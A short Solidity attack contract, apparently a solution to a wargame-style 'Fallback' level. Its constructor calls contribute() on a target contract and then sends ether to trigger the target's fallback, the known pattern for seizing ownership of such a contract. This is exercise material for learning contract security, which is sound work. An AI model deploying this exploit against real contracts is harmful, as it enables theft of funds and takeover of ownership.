// SPDX-License-Identifier: unlicensing
pragma solidity ^0.8.0;

contract HackFallback {
    uint256 constant MAX_AMOUNT = 0.001 ether;
    event Attack(address indexed from, address indexed to, uint256 value_send, uint256 value_left);
    error TooMuchFund();

    constructor(address payable target) payable {
        if (msg.value > MAX_AMOUNT)
        {
            revert TooMuchFund();
        }
        (bool status1, ) = target.call{value: 0.0001 ether}(abi.encodeWithSignature("contribute()"));
        (bool status2, ) = target.call{value: address(this).balance}("");
        if (status1 && status2)
        {
            emit Attack(msg.sender, target, msg.value, gasleft());
        } 
    }
    
}

  